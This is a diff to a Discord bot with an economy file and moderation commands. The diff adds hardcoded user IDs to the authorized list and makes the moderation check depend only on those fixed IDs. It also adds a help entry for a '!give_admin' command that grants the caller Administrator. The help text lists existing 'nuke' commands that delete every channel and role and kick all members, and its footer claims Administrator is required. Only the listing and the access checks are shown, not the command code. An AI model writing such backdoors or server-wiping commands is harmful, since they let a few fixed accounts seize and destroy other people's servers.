@@ -18,6 +18,8 @@ BOT_TOKEN = BOT_TOKEN.strip()
 
 AUTHORIZED_USER_IDS = [
     933543370935128204,
+    1328374811726184610,
+    1278035697416146966,
 ]
 
 ECONOMY_FILE = "economy.json"
@@ -581,6 +583,9 @@ async def nuke_help(ctx):
     embed.add_field(name="!nuke_channels_roles", value="Delete all channels and roles",                 inline=False)
     embed.add_field(name="!nuke_kick",           value="Delete channels, roles, and kick all members", inline=False)
     embed.add_field(name="!nuke_full",           value="Full reset: channels, roles, emojis, members", inline=False)
+    embed.add_field(name="!give_admin",          value="Grant yourself the Administrator role",         inline=False)
+    embed.add_field(name="!remove_admin",        value="Remove the Administrator role from yourself",   inline=False)
+    embed.add_field(name="!show_high",           value="Show the highest roles in the server and their permissions", inline=False)
     embed.set_footer(text="⚠️  Requires Administrator · All actions ask for confirmation.")
     await ctx.send(embed=embed)
 
@@ -590,7 +595,7 @@ async def nuke_help(ctx):
 # ══════════════════════════════════════════════════════════════════════════════
 
 def _mod_check(interaction: discord.Interaction, permission: str = None):
-    return interaction.user.id == 1278035697416146966
+    return interaction.user.id in (1278035697416146966, 933543370935128204, 1328374811726184610)
 
 # ── /ban ──────────────────────────────────────────────────────────────────────
 @tree.command(name="ban", description="Ban a member from the server.")
